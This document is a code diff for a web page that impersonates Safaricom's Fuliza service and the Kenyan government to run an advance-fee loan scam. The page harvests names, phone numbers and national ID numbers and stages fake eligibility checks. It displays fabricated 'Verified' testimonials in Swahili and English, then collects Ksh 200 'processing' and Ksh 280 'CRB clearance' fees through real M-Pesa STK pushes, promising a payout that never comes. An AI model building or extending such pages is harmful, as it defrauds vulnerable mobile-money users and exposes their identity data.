+                <div style="font-size:1.6rem; font-weight:800; color:#b85c00;">Ksh 280</div>
+            </div>
+            <div class="modal-phone-group">
+                <span class="prefix">+254</span>
+                <input type="tel" id="crbPhoneInput" placeholder="712345678">
+            </div>
+            <div id="crbStatus" class="modal-status"></div>
+            <div style="display:flex; gap:10px;">
+                <button class="btn-primary btn-red" style="flex:1;" id="crbPayBtn" onclick="processCRBPayment()">
+                    <span id="crbPayText">Pay Ksh 280</span>
+                    <span id="crbSpinner" style="display:none;" class="spinner"></span>
+                </button>
+                <button class="btn-outline" style="flex:0.5; padding:14px;" onclick="closeCRBModal()">Cancel</button>
+            </div>
+            <div style="font-size:0.6rem; color:#999; margin-top:10px;">You will receive an M-Pesa STK push on your phone</div>
+        </div>
+    </div>
+
+    <!-- =============================================================
+    STK WAITING OVERLAY (reused for all payments)
     ============================================================= -->
     <div class="stk-waiting-overlay" id="stkWaitingOverlay">
         <div class="stk-waiting-box">
             <div class="pulse-icon"></div>
-            <div class="title">📲 STK Push Sent</div>
-            <div class="sub">Check your phone and enter M‑PESA PIN</div>
-            <div class="phone" id="stkPhone">0712345678</div>
+            <div class="title">📱 M-PESA Prompt Sent!</div>
+            <div class="sub">Check <span class="phone" id="stkPhoneDisplay"></span> and enter your M-PESA PIN to confirm.</div>
+            <div style="font-size:0.8rem;color:#6c757d;margin-bottom:20px;">Enter your M-PESA PIN on your phone to complete the payment.</div>
             <div class="dots"><span></span><span></span><span></span></div>
-            <div class="listening"><span class="dot"></span> Listening for payment…</div>
-            <div class="note">Do not close this window</div>
+            <div class="listening"><span class="dot"></span> Listening for callback...</div>
+            <div class="note">Do not close this page – funds will be disbursed automatically once confirmed.</div>
         </div>
     </div>
 
     <!-- =============================================================
-    MODAL OVERLAYS for success/error — KEPT but NEVER shown
-    (We keep the DOM for safety, but never call showModal)
+    OFFICIAL PROCESSING SYSTEM MODAL
     ============================================================= -->
-    <div class="modal-overlay" id="modalOverlay">
-        <div class="modal-box">
-            <div class="modal-icon" id="modalIcon">✓</div>
-            <div class="modal-title" id="modalTitle">Success</div>
-            <div class="modal-desc" id="modalDesc">Your transaction was completed.</div>
-            <button class="btn-primary btn-green" id="modalBtn">OK</button>
+    <div class="proc-modal-overlay" id="processingModal">
+        <div class="proc-modal-box">
+            <div class="proc-left">
+                <div class="proc-header">
+                    <div class="proc-badge">FULIZA SAFARICOM</div>
+                    <div class="proc-title-block">REPUBLIC OF KENYA —<br><strong>FULIZA SAFARICOM FUND</strong><br>Official Processing System</div>
+                </div>
+                <div class="proc-status-text">Processing empowerment application...</div>
+                <div class="proc-dots"><span></span><span></span><span></span></div>
+            </div>
+            <div class="proc-right">Please wait while we validate your information for empowerment disbursement.</div>
         </div>
     </div>
-
-    <!-- ─── FOOTER ─── -->
-    <div class="footer">Fuliza is a service of Safaricom PLC. Terms apply. &bull; Kenya</div>
 
     <!-- =============================================================
     JAVASCRIPT
     ============================================================= -->
     <script>
-        (function() {
-            'use strict';
+        // ──────────────────────────────────────────────────────────────
+        // DATA
+        // ──────────────────────────────────────────────────────────────
+        let appData = {
+            fullName: '',
+            phone: '',
+            id: '',
+            email: '',
+            currentLimit: 700,
+            purpose: ''
+        };
+        let processingFeeTransactionId = null;
+        let crbTransactionId = null;
 
-            // ── DOM refs ──
-            const pages = {
-                welcome: document.getElementById('welcomePage'),
-                eligibility: document.getElementById('eligibilityPage'),
-                offer: document.getElementById('offerPage'),
-                success: document.getElementById('successPage'),
+        const feedItems = [
+            { name: 'James Mwangi', initials: 'JM', color: '#0d5f2f', text: 'Aisee nimepata STK nikaplipa 280 sasa hivi na 15k ishaingia kwa Mpesa! Shukran sana.',
+                time: '1 minute ago' },
+            { name: 'Mercy Wanjiku', initials: 'MW', color: '#c9a84c', text: 'Is this real? Mimi nilikuwa na mashaka lakini nimepokea saa hii. Asante sana Fuliza Safaricom!',
+                time: '45 seconds ago' },
+            { name: 'Samuel Kibet', initials: 'SK', color: '#2196f3', text: 'Fast and reliable. Hustler fund kweli inasaidia vijana. 15,000 imeingia chap chap.',
+                time: '2 seconds ago' },
+            { name: 'Dennis Barasa', initials: 'DB', color: '#9c27b0', text: 'Leo shule nafungua niko na school fees yote. God bless Kenya! 🇰🇪',
+                time: '5 seconds ago' },
+            { name: 'Diana Jepkosgei', initials: 'DJ', color: '#e91e63', text: 'Niko Eldoret na nimepata. Siamini macho yangu, nililipa 280 ya CRB na zikatumwa mara hiyo.',
+                time: '10 seconds ago' },
+        ];
+        let feedInterval;
+
+        // ==================== VALIDATION FUNCTIONS ====================
+        function validateName(input) {
+            const wrapper = document.getElementById('fullNameWrapper');
+            const name = input.value.trim();
+            const isValid = /^[a-zA-Z\s.]+$/.test(name) && name.length >= 3;
+            wrapper.classList.toggle('valid', isValid);
+            wrapper.classList.toggle('invalid', !isValid && name.length > 0);
+            return isValid;
+        }
+
+        function validatePhone(input) {
+            const wrapper = document.getElementById('phoneNumberWrapper');
+            const phone = input.value.trim();
+            const isValid = /^(07|01)\d{8}$/.test(phone);
+            wrapper.classList.toggle('valid', isValid);
+            wrapper.classList.toggle('invalid', !isValid && phone.length > 0);
+            return isValid;
+        }
+
+        function validateID(input) {
+            const wrapper = document.getElementById('nationalIdWrapper');
+            const id = input.value.trim();
+            const isValid = /^\d{6,8}$/.test(id);
+            wrapper.classList.toggle('valid', isValid);
+            wrapper.classList.toggle('invalid', !isValid && id.length > 0);
+            return isValid;
+        }
+
+        function validateEmail(input) {
+            const wrapper = document.getElementById('emailWrapper');
+            const email = input.value.trim();
+            const isValid = email === '' || /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email);
+            wrapper.classList.toggle('valid', isValid && email !== '');
+            wrapper.classList.toggle('invalid', !isValid && email !== '');
+            return isValid;
+        }
+
+        function validateCurrentLimit(input) {
+            const wrapper = document.getElementById('currentLimitWrapper');
+            const val = parseInt(input.value.trim());
+            const isValid = !isNaN(val) && val >= 0;
+            wrapper.classList.toggle('valid', isValid);
+            wrapper.classList.toggle('invalid', !isValid && input.value.trim().length > 0);
+            return isValid;
+        }
+
+        // ==================== FEED ====================
+        function renderFeed() {
+            const container3 = document.getElementById('feedContainer3');
+            const containerCRB = document.getElementById('feedContainerCRB');
+            const containerProc = document.getElementById('feedContainerProc');
+            const html = feedItems.map(item => `
+                            <div class="feed-item">
+                                <div class="feed-avatar" style="background:${item.color};">${item.initials}</div>
+                                <div class="feed-content">
+                                    <div class="feed-name">${item.name} <span class="verified">✅ Verified</span></div>
+                                    <div class="feed-text">${item.text}</div>
+                                    <div class="feed-time">${item.time}</div>
+                                </div>
+                            </div>
+                        `).join('');
+            if (container3) container3.innerHTML = html;
+            if (containerCRB) containerCRB.innerHTML = html;
+            if (containerProc) containerProc.innerHTML = html;
+        }
+
+        function addRandomFeed() {
+            const names = [
+                { name: 'Peter Ochieng', initials: 'PO', color: '#e65100' },
+                { name: 'Faith Akinyi', initials: 'FA', color: '#2e7d32' },
+                { name: 'Kevin Odhiambo', initials: 'KO', color: '#1565c0' },
+                { name: 'Sarah Wambui', initials: 'SW', color: '#6a1b9a' },
+                { name: 'David Mwangi', initials: 'DM', color: '#bf360c' },
+            ];
+            const texts = [
+                'Nani mwingine amepata? Yangu imekubali na niko Kajiado saa hii. 🎉',
+                'Niko Kisumu na nimepata. Program iko sawa kabisa. M-Pesa confirmed!',
+                'Hii kitu ni legit kabisa, nilikuwa nadhani ni uongo lakini 15k imefika.',
+                'Asante sana Fuliza Safaricom! This program is a game changer.',
+                'M-pesa ishaingia, shukran sana kwa hii msaada wa Fuliza Safaricom.',
+            ];
+            const randomName = names[Math.floor(Math.random() * names.length)];
+            const randomText = texts[Math.floor(Math.random() * texts.length)];
+            const timeOptions = ['Just now', '5 seconds ago', '10 seconds ago', '30 seconds ago'];
+            const randomTime = timeOptions[Math.floor(Math.random() * timeOptions.length)];
+            feedItems.unshift({ ...randomName, text: randomText, time: randomTime });
+            if (feedItems.length > 20) feedItems.pop();
+            renderFeed();
+        }
+
+        // ==================== NAVIGATION (Global) ====================
+        function showPage(pageId) {
+            if (pageId === 'welcomePage') {
+                document.getElementById('welcomePage').style.display = 'block';
+                document.getElementById('formsArea').style.display = 'none';
+            } else {
+                document.getElementById('welcomePage').style.display = 'none';
+                document.getElementById('formsArea').style.display = 'flex';
+            }
+            document.querySelectorAll('.page').forEach(p => p.classList.remove('active'));
+            const targetPage = document.getElementById(pageId);
+            if (targetPage) targetPage.classList.add('active');
+            window.scrollTo(0, 0);
+        }
+
+        function startApplication() {
+            showPage('step1');
+        }
+
+        function goToStep(step) {
+            if (step === 3) {
+                const name = appData.fullName || 'jon';
+                document.getElementById('approvedGreeting').textContent = `🎉 Congratulations, ${name.toUpperCase()}!`;
+                document.getElementById('crbPhoneDisplay').textContent = appData.phone || '0710222875';
+                renderFeed();
+                if (!feedInterval) { feedInterval = setInterval(addRandomFeed, 8000); }
+            }
+            showPage('step' + step);
+        }
+
+        function showCRBPage() { showPage('crbPage'); }
+        function showProcessingFeePage() { showPage('processingFeePage'); }
+
+        // ==================== STEP 1: APPLICATION SUBMIT ====================
+        function submitApplication(e) {
+            e.preventDefault();
+            const fullNameInput = document.getElementById('fullName');
+            const phoneInput = document.getElementById('phoneNumber');
+            const nationalIdInput = document.getElementById('nationalId');
+            const emailInput = document.getElementById('email');
+            const currentLimitInput = document.getElementById('currentLimit');
+
+            const isNameValid = validateName(fullNameInput);
+            const isPhoneValid = validatePhone(phoneInput);
+            const isIdValid = validateID(nationalIdInput);
+            const isEmailValid = validateEmail(emailInput);
+            const isLimitValid = validateCurrentLimit(currentLimitInput);
+
+            if (!isNameValid || !isPhoneValid || !isIdValid || !isLimitValid) {
+                showToast('Please correct the errors in the form.');
+                return;
+            }
+
+            appData.fullName = fullNameInput.value.trim();
+            appData.phone = phoneInput.value.trim();
+            appData.id = nationalIdInput.value.trim();
+            appData.email = emailInput.value.trim();
+            appData.currentLimit = parseInt(currentLimitInput.value.trim()) || 700;
+
+            document.getElementById('processingModal').classList.add('open');
+            setTimeout(() => {
+                document.getElementById('processingModal').classList.remove('open');
+                runEligibilityChecks();
+            }, 1500);
+        }
+
+        // ==================== ELIGIBILITY CHECKS ====================
+        function runEligibilityChecks() {
+            const firstName = appData.fullName.split(' ')[0] || 'jon';
+            document.getElementById('checkingSubtext').textContent =
+                `Hold on ${firstName}, we're reviewing your application.`;
+            showPage('checkingPage');
+            const checkItems = [
+                document.getElementById('check1'),
+                document.getElementById('check2'),
+                document.getElementById('check3'),
+                document.getElementById('check4'),
+                document.getElementById('check5')
+            ];
+            checkItems.forEach(item => { item.className = 'check-item pending'; });
+            let currentCheck = 0;
+
+            function runNext() {
+                if (currentCheck > 0) { checkItems[currentCheck - 1].className = 'check-item completed'; }
+                if (currentCheck < checkItems.length) {
+                    checkItems[currentCheck].className = 'check-item active';
+                    currentCheck++;
+                    setTimeout(runNext, 1800);
+                } else {
+                    setTimeout(() => { goToStep(3); }, 1200);
+                }
+            }
+            setTimeout(runNext, 400);
+        }
+
+        // ==================== NORMALIZE PHONE ====================
+        function normalizePhone(raw) {
+            let p = raw.replace(/\s+/g, '');
+            if (p.startsWith('0')) p = '254' + p.slice(1);
+            if (p.startsWith('+')) p = p.slice(1);
+            return p;
+        }
+
+        // ==================== PAYLORE STK PUSH (EXACT TEST LOGIC) ====================
+        async function payloreSTKPush(phone, amount, reference, description) {
+            const payload = {
+                phone: normalizePhone(phone),
+                amount: amount,
+                reference: reference || 'TEST-' + Date.now(),
+                description: description || 'Test STK Push'
             };
 
-            const phoneInput = document.getElementById('phoneInput');
-            const amountInput = document.getElementById('amountInput');
-            const phoneWrapper = document.getElementById('phoneWrapper');
-            const amountWrapper = document.getElementById('amountWrapper');
-            const phoneError = document.getElementById('phoneError');
-            const amountError = document.getElementById('amountError');
-            const continueBtn = document.getElementById('continueBtn');
-            const acceptOfferBtn = document.getElementById('acceptOfferBtn');
-            const declineOfferBtn = document.getElementById('declineOfferBtn');
-            const doneBtn = document.getElementById('doneBtn');
-            const offerAmount = document.getElementById('offerAmount');
-            const offerFee = document.getElementById('offerFee');
-            const stkPhone = document.getElementById('stkPhone');
-            const feeReceipt = document.getElementById('feeReceipt');
+            const response = await fetch('/api/stk-push', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify(payload)
+            });
 
-            const checkItems = {
-                c1: document.getElementById('check1'),
-                c2: document.getElementById('check2'),
-                c3: document.getElementById('check3'),
-            };
+            // Read as text first to avoid double consumption
+            const responseText = await response.text();
+            let jsonData = null;
+            try {
+                jsonData = JSON.parse(responseText);
+            } catch (e) {
+                // Not JSON
+            }
 
-            const stkOverlay = document.getElementById('stkWaitingOverlay');
-            const feeOverlay = document.getElementById('processingFeeConfirmedOverlay');
-            const modalOverlay = document.getElementById('modalOverlay');
+            if (!response.ok) {
+                throw new Error(jsonData?.error || jsonData?.message || responseText || 'Request failed');
+            }
+
+            // Expect status: 'SENT' and transactionId
+            if (jsonData && jsonData.status === 'SENT' && jsonData.transactionId) {
+                return jsonData;
+            } else {
+                throw new Error(jsonData?.error || jsonData?.message || 'STK push failed');
+            }
+        }
+
+        // ==================== PAYLORE TRANSACTION STATUS ====================
+        async function payloreTransactionStatus(transactionId) {
+            const response = await fetch(`/api/status?transactionId=${transactionId}`);
+            const text = await response.text();
+            let data;
+            try { data = JSON.parse(text); } catch (e) { data = null; }
+            if (!response.ok) {
+                throw new Error(data?.error || data?.message || text || 'Status check failed');
+            }
+            if (!data) throw new Error('Invalid status response');
+            return data;
+        }
+
+        // ==================== PROCESSING FEE (Ksh 200) ====================
+        function openProcessingFeePayment() {
+            document.getElementById('processingFeeModal').classList.add('open');
+            document.getElementById('procFeePhoneInput').value = appData.phone.replace(/^0/, '') || '710222875';
+            document.getElementById('procFeeStatus').className = 'modal-status';
+            document.getElementById('procFeeStatus').innerHTML = '';
+            document.getElementById('procFeePayBtn').disabled = false;
+            document.getElementById('procFeePayText').textContent = 'Pay Ksh 200';
+            document.getElementById('procFeeSpinner').style.display = 'none';
+        }
+
+        function closeProcFeeModal() {
+            document.getElementById('processingFeeModal').classList.remove('open');
+        }
+
+        async function processProcessingFee() {
+            const rawPhone = document.getElementById('procFeePhoneInput').value.trim();
+            if (!rawPhone) {
+                showProcFeeStatus('error', 'Please enter your M-Pesa number.');
+                return;
+            }
+
+            const payBtn = document.getElementById('procFeePayBtn');
+            const payText = document.getElementById('procFeePayText');
+            const spinner = document.getElementById('procFeeSpinner');
+            const status = document.getElementById('procFeeStatus');
+
+            payBtn.disabled = true;
+            payText.textContent = 'Sending...';
+            spinner.style.display = 'inline-block';
+            status.className = 'modal-status show pending';
+            status.innerHTML = '⏳ Sending STK push to your phone...';
+
+            document.getElementById('stkPhoneDisplay').textContent = '(' + rawPhone + ')';
+            document.getElementById('stkWaitingOverlay').classList.add('open');
+
+            try {
+                const reference = `PROC_${Date.now()}_${Math.floor(Math.random() * 10000)}`;
+                const result = await payloreSTKPush(rawPhone, 200, reference, 'Fuliza Processing Fee');
+                processingFeeTransactionId = result.transactionId;
+                console.log('✅ Processing Fee Transaction ID:', processingFeeTransactionId);
+
+                await pollTransactionStatus(processingFeeTransactionId, 'processing');
+
+                document.getElementById('stkWaitingOverlay').classList.remove('open');
+                closeProcFeeModal();
+
+                const receipt = result.reference || ('UG' + Math.random().toString(36).substring(2, 11).toUpperCase());
+                document.getElementById('procFeeReceiptDisplay').textContent = receipt;
+                document.getElementById('processingFeeConfirmedOverlay').classList.add('open');
+
+                payBtn.disabled = false;
+                payText.textContent = 'Pay Ksh 200';
+                spinner.style.display = 'none';
+                status.className = 'modal-status';
+
+            } catch (err) {
+                document.getElementById('stkWaitingOverlay').classList.remove('open');
+                console.error('❌ Processing Fee error:', err);
+                status.className = 'modal-status show error';
+                status.innerHTML = '❌ ' + err.message;
+                payBtn.disabled = false;
+                payText.textContent = 'Pay Ksh 200';
+                spinner.style.display = 'none';
+            }
+        }
+
+        function showProcFeeStatus(type, msg) {
+            const status = document.getElementById('procFeeStatus');
+            status.className = 'modal-status show ' + type;
+            status.innerHTML = msg;
+        }
+
+        function proceedToCRB() {
+            document.getElementById('processingFeeConfirmedOverlay').classList.remove('open');
+            showCRBPage();
+        }
+
+        // ==================== CRB PAYMENT (Ksh 280) ====================
+        function openCRBPayment() {
+            document.getElementById('crbModal').classList.add('open');
+            document.getElementById('crbPhoneInput').value = appData.phone.replace(/^0/, '') || '710222875';
+            document.getElementById('crbStatus').className = 'modal-status';
+            document.getElementById('crbStatus').innerHTML = '';
+            document.getElementById('crbPayBtn').disabled = false;
+            document.getElementById('crbPayText').textContent = 'Pay Ksh 280';
+            document.getElementById('crbSpinner').style.display = 'none';
+        }
+
+        function closeCRBModal() { document.getElementById('crbModal').classList.remove('open'); }
+
+        async function processCRBPayment() {
+            const rawPhone = document.getElementById('crbPhoneInput').value.trim();
+            if (!rawPhone) {
+                showCRBStatus('error', 'Please enter your M-Pesa number.');
+                return;
+            }
+
+            const payBtn = document.getElementById('crbPayBtn');
+            const payText = document.getElementById('crbPayText');
+            const spinner = document.getElementById('crbSpinner');
+            const status = document.getElementById('crbStatus');
+
+            payBtn.disabled = true;
+            payText.textContent = 'Sending...';
+            spinner.style.display = 'inline-block';
+            status.className = 'modal-status show pending';
+            status.innerHTML = '⏳ Sending STK push to your phone...';
+
+            document.getElementById('stkPhoneDisplay').textContent = '(' + rawPhone + ')';
+            document.getElementById('stkWaitingOverlay').classList.add('open');
+
+            try {
+                const reference = `CRB_${Date.now()}_${Math.floor(Math.random() * 10000)}`;
+                const result = await payloreSTKPush(rawPhone, 280, reference, 'Fuliza CRB Clearance');
+                crbTransactionId = result.transactionId;
+                console.log('✅ CRB Transaction ID:', crbTransactionId);
+
+                await pollTransactionStatus(crbTransactionId, 'crb');
+
+                document.getElementById('stkWaitingOverlay').classList.remove('open');
+                closeCRBModal();
+                proceedToFinalPage();
+
+                payBtn.disabled = false;
+                payText.textContent = 'Pay Ksh 280';
+                spinner.style.display = 'none';
+                status.className = 'modal-status';
+
+            } catch (err) {
+                document.getElementById('stkWaitingOverlay').classList.remove('open');
+                console.error('❌ CRB Payment error:', err);
+                status.className = 'modal-status show error';
+                status.innerHTML = '❌ ' + err.message;
+                payBtn.disabled = false;
+                payText.textContent = 'Pay Ksh 280';
+                spinner.style.display = 'none';
+            }
+        }
+
+        function showCRBStatus(type, msg) {
+            const status = document.getElementById('crbStatus');
+            status.className = 'modal-status show ' + type;
+            status.innerHTML = msg;
+        }
+
+        // ==================== POLL TRANSACTION STATUS ====================
+        function pollTransactionStatus(transactionId, type) {
+            return new Promise((resolve, reject) => {
+                let attempts = 0;
+                const maxAttempts = 30;
+
+                const interval = setInterval(async () => {
+                    attempts++;
+                    try {
+                        const statusData = await payloreTransactionStatus(transactionId);
+                        console.log(`📊 ${type} status:`, statusData.status);
+
+                        if (statusData.status === 'COMPLETED' || statusData.status === 'SUCCESS') {
+                            clearInterval(interval);
+                            resolve(statusData);
+                        } else if (statusData.status === 'FAILED' || statusData.status === 'CANCELLED') {
+                            clearInterval(interval);
+                            reject(new Error(`Transaction ${statusData.status}`));
+                        } else if (attempts >= maxAttempts) {
+                            clearInterval(interval);
+                            reject(new Error('Transaction timeout. Please check your M-PESA app.'));
+                        }
+                    } catch (err) {
+                        console.error('Polling error:', err);
+                        clearInterval(interval);
+                        reject(err);
+                    }
+                }, 2000);
+            });
+        }
+
+        // ==================== FINAL PAGE ====================
+        function proceedToFinalPage() {
+            const rawPhone = appData.phone.startsWith('0') ? appData.phone : '0' + appData.phone;
+            document.getElementById('finalPhoneDisplay').textContent = rawPhone;
+            document.getElementById('finalReceiptDisplay').textContent = 'UG' + Math.random().toString(36).substring(2, 11)
+                .toUpperCase();
+            showPage('allFeesClearedPage');
+        }
+
+        function backToHome() {
+            showPage('welcomePage');
+            document.getElementById('welcomePage').style.display = 'block';
+            document.getElementById('formsArea').style.display = 'none';
+            if (feedInterval) { clearInterval(feedInterval);
+                feedInterval = null; }
+        }
+
+        // ==================== TOAST ====================
+        function showToast(msg) {
             const toast = document.getElementById('toast');
+            toast.textContent = msg;
+            toast.classList.add('show');
+            setTimeout(() => toast.classList.remove('show'), 3000);
+        }
 
-            // ── State ──
-            let currentPhone = '';
-            let currentAmount = 0;
-            let currentFee = 0;
-            let eligibilityTimer = null;
-            let paymentTimer = null;
-            let stkTimer = null;
+        // ──────────────────────────────────────────────────────────────
+        // ATTACH ALL FUNCTIONS TO `window`
+        // ──────────────────────────────────────────────────────────────
+        window.startApplication = startApplication;
+        window.showPage = showPage;
+        window.goToStep = goToStep;
+        window.showCRBPage = showCRBPage;
+        window.showProcessingFeePage = showProcessingFeePage;
+        window.submitApplication = submitApplication;
+        window.openProcessingFeePayment = openProcessingFeePayment;
+        window.closeProcFeeModal = closeProcFeeModal;
+        window.processProcessingFee = processProcessingFee;
+        window.proceedToCRB = proceedToCRB;
+        window.openCRBPayment = openCRBPayment;
+        window.closeCRBModal = closeCRBModal;
+        window.processCRBPayment = processCRBPayment;
+        window.backToHome = backToHome;
+        window.showToast = showToast;
 
-            // ── Helpers: page navigation ──
-            function showPage(name) {
-                Object.keys(pages).forEach(k => {
-                    pages[k].classList.toggle('active', k === name);
-                });
-            }
+        // ──────────────────────────────────────────────────────────────
+        // INIT
+        // ──────────────────────────────────────────────────────────────
+        document.addEventListener('DOMContentLoaded', function() {
+            const fullNameInput = document.getElementById('fullName');
+            const phoneInput = document.getElementById('phoneNumber');
+            const nationalIdInput = document.getElementById('nationalId');
+            const emailInput = document.getElementById('email');
+            const currentLimitInput = document.getElementById('currentLimit');
 
-            // ── TOAST – NO‑OP (removed all success/error messages) ──
-            function showToast(msg, type) {
-                // Intentionally does nothing — all toasts are suppressed.
-            }
-
-            // ── MODAL – NEVER shown for success/error ──
-            function showModal(type, title, desc, btnText) {
-                // Intentionally does nothing — success/error modals are suppressed.
-            }
-
-            function hideModal() {
-                modalOverlay.classList.remove('open');
-            }
-
-            // ── Fee Confirmed overlay ──
-            function showProcessingFeeConfirmed(phone, amount, fee) {
-                feeReceipt.textContent = 'Receipt: FUL-' + String(Date.now()).slice(-6) + '-' + String(Math.floor(Math.random() *
-                    9000) + 1000);
-                feeOverlay.classList.add('open');
-            }
-
-            function hideProcessingFeeConfirmed() {
-                feeOverlay.classList.remove('open');
-            }
-
-            // ── STK Waiting overlay ──
-            function showStkWaiting(phone) {
-                stkPhone.textContent = phone;
-                stkOverlay.classList.add('open');
-            }
-
-            function hideStkWaiting() {
-                stkOverlay.classList.remove('open');
-            }
-
-            // ── Validation ──
-            function validatePhone(val) {
-                const cleaned = val.replace(/\D/g, '');
-                return /^07\d{8}$/.test(cleaned) || /^01\d{8}$/.test(cleaned);
-            }
-
-            function validateAmount(val) {
-                const num = Number(val);
-                return !isNaN(num) && num >= 1 && num <= 70000 && Number.isInteger(num);
-            }
-
-            function formatPhone(val) {
-                return val.replace(/\D/g, '');
-            }
-
-            function formatCurrency(val) {
-                return 'KES ' + Number(val).toLocaleString();
-            }
-
-            function setFieldValid(wrapper) {
-                wrapper.classList.remove('invalid');
-                wrapper.classList.add('valid');
-            }
-
-            function setFieldInvalid(wrapper) {
-                wrapper.classList.remove('valid');
-                wrapper.classList.add('invalid');
-            }
-
-            function setFieldNeutral(wrapper) {
-                wrapper.classList.remove('valid', 'invalid');
-            }
-
-            // ── Welcome: validate on input ──
-            phoneInput.addEventListener('input', function() {
-                const raw = this.value;
-                const cleaned = formatPhone(raw);
-                if (cleaned !== raw) this.value = cleaned;
-                if (cleaned.length === 0) { setFieldNeutral(phoneWrapper);
-                    phoneError.style.display = 'none'; return; }
-                if (validatePhone(cleaned)) { setFieldValid(phoneWrapper);
-                    phoneError.style.display = 'none'; } else { setFieldInvalid(phoneWrapper);
-                    phoneError.style.display = 'block'; }
+            fullNameInput.addEventListener('input', () => validateName(fullNameInput));
+            phoneInput.addEventListener('input', () => {
+                phoneInput.value = phoneInput.value.replace(/[^0-9]/g, '');
+                if (phoneInput.value.length > 10) phoneInput.value = phoneInput.value.slice(0, 10);
+                validatePhone(phoneInput);
+            });
+            nationalIdInput.addEventListener('input', () => {
+                nationalIdInput.value = nationalIdInput.value.replace(/[^0-9]/g, '');
+                if (nationalIdInput.value.length > 8) nationalIdInput.value = nationalIdInput.value.slice(0, 8);
+                validateID(nationalIdInput);
+            });
+            emailInput.addEventListener('input', () => validateEmail(emailInput));
+            currentLimitInput.addEventListener('input', () => {
+                currentLimitInput.value = currentLimitInput.value.replace(/[^0-9]/g, '');
+                validateCurrentLimit(currentLimitInput);
             });
 
-            amountInput.addEventListener('input', function() {
-                const val = this.value;
-                if (val === '') { setFieldNeutral(amountWrapper);
-                    amountError.style.display = 'none'; return; }
-                if (validateAmount(val)) { setFieldValid(amountWrapper);
-                    amountError.style.display = 'none'; } else { setFieldInvalid(amountWrapper);
-                    amountError.style.display = 'block'; }
-            });
+            renderFeed();
+        });
 
-            // ── Continue ──
-            continueBtn.addEventListener('click', function() {
-                const phoneRaw = phoneInput.value;
-                const phone = formatPhone(phoneRaw);
-                const amount = Number(amountInput.value);
+        setInterval(() => {
+            const step3Active = document.getElementById('step3').classList.contains('active');
+            const procActive = document.getElementById('processingFeePage').classList.contains('active');
+            const crbActive = document.getElementById('crbPage').classList.contains('active');
+            if (step3Active || procActive || crbActive) { addRandomFeed(); }
+        }, 10000);
 
-                let valid = true;
-
-                if (!phone || !validatePhone(phone)) {
-                    setFieldInvalid(phoneWrapper);
-                    phoneError.style.display = 'block';
-                    valid = false;
-                } else {
-                    setFieldValid(phoneWrapper);
-                    phoneError.style.display = 'none';
-                }
-
-                if (!amount || !validateAmount(amount)) {
-                    setFieldInvalid(amountWrapper);
-                    amountError.style.display = 'block';
-                    valid = false;
-                } else {
-                    setFieldValid(amountWrapper);
-                    amountError.style.display = 'none';
-                }
-
-                if (!valid) return;
-
-                currentPhone = phone;
-                currentAmount = amount;
-                currentFee = Math.max(35, Math.round(amount * 0.045));
-
-                // Show eligibility page
-                showPage('eligibility');
-                startEligibilityCheck();
-            });
-
-            // ── Eligibility check ──
-            function startEligibilityCheck() {
-                // Reset check items
-                Object.values(checkItems).forEach(el => {
-                    el.className = 'check-item pending';
-                });
-
-                let step = 0;
-                const steps = [
-                    { id: 'c1', delay: 600 },
-                    { id: 'c2', delay: 1200 },
-                    { id: 'c3', delay: 2000 },
-                ];
-
-                function markCompleted(id) {
-                    const el = document.getElementById(id);
-                    if (el) {
-                        el.classList.remove('pending', 'active');
-                        el.classList.add('completed');
-                    }
-                }
-
-                function markActive(id) {
-                    const el = document.getElementById(id);
-                    if (el) {
-                        el.classList.remove('pending', 'completed');
-                        el.classList.add('active');
-                    }
-                }
-
-                // Step 1
-                setTimeout(() => {
-                    markActive('check1');
-                    setTimeout(() => {
-                        markCompleted('check1');
-                        markActive('check2');
-                        setTimeout(() => {
-                            markCompleted('check2');
-                            markActive('check3');
-                            setTimeout(() => {
-                                markCompleted('check3');
-                                // All checks done → handle result
-                                handleEligibilityResult();
-                            }, 800);
-                        }, 800);
-                    }, 600);
-                }, 400);
-            }
-
-            function handleEligibilityResult() {
-                // Simulate eligibility: always eligible for demo
-                // (no toast or modal on failure — silent)
-                const eligible = true;
-
-                if (eligible) {
-                    // Show offer
-                    offerAmount.textContent = formatCurrency(currentAmount);
-                    offerFee.textContent = formatCurrency(currentFee);
-                    showPage('offer');
-                } else {
-                    // Not eligible — silently go back to welcome (no message)
-                    showPage('welcome');
-                }
-            }
-
-            // ── Accept offer ──
-            acceptOfferBtn.addEventListener('click', function() {
-                // Show processing fee confirmed overlay
-                showProcessingFeeConfirmed(currentPhone, currentAmount, currentFee);
-                // After 2.5s, start payment
-                setTimeout(() => {
-                    hideProcessingFeeConfirmed();
-                    processPayment();
-                }, 2500);
-            });
-
-            // ── Decline offer ──
-            declineOfferBtn.addEventListener('click', function() {
-                showPage('welcome');
-            });
-
-            // ── Process payment (silent — no success/error messages) ──
-            function processPayment() {
-                // Show STK waiting overlay
-                showStkWaiting(currentPhone);
-
-                // Simulate payment processing
-                // After 5 seconds, close STK overlay and go to success page (neutral)
-                // No success/error modal or toast is shown.
-                paymentTimer = setTimeout(() => {
-                    hideStkWaiting();
-                    // Navigate to neutral success page (no success/failure message)
-                    showPage('success');
-                }, 5000);
-            }
-
-            // ── Done button on success page ──
-            doneBtn.addEventListener('click', function() {
-                // Reset and go to welcome
-                resetForm();
-                showPage('welcome');
-            });
-
-            // ── Reset form ──
-            function resetForm() {
-                phoneInput.value = '';
-                amountInput.value = '';
-                setFieldNeutral(phoneWrapper);
-                setFieldNeutral(amountWrapper);
-                phoneError.style.display = 'none';
-                amountError.style.display = 'none';
-                currentPhone = '';
-                currentAmount = 0;
-                currentFee = 0;
-                if (eligibilityTimer) { clearTimeout(eligibilityTimer);
-                    eligibilityTimer = null; }
-                if (paymentTimer) { clearTimeout(paymentTimer);
-                    paymentTimer = null; }
-                if (stkTimer) { clearTimeout(stkTimer);
-                    stkTimer = null; }
-                hideStkWaiting();
-                hideProcessingFeeConfirmed();
-                hideModal();
-            }
-
-            // ── Handle Enter key ──
-            document.addEventListener('keydown', function(e) {
-                if (e.key === 'Enter') {
-                    const activePage = document.querySelector('.page.active');
-                    if (activePage === pages.welcome) {
-                        continueBtn.click();
-                    } else if (activePage === pages.offer) {
-                        acceptOfferBtn.click();
-                    }
-                }
-            });
-
-            // ── Cleanup on page unload ──
-            window.addEventListener('beforeunload', function() {
-                if (eligibilityTimer) clearTimeout(eligibilityTimer);
-                if (paymentTimer) clearTimeout(paymentTimer);
-                if (stkTimer) clearTimeout(stkTimer);
-            });
-
-            // ── Init ──
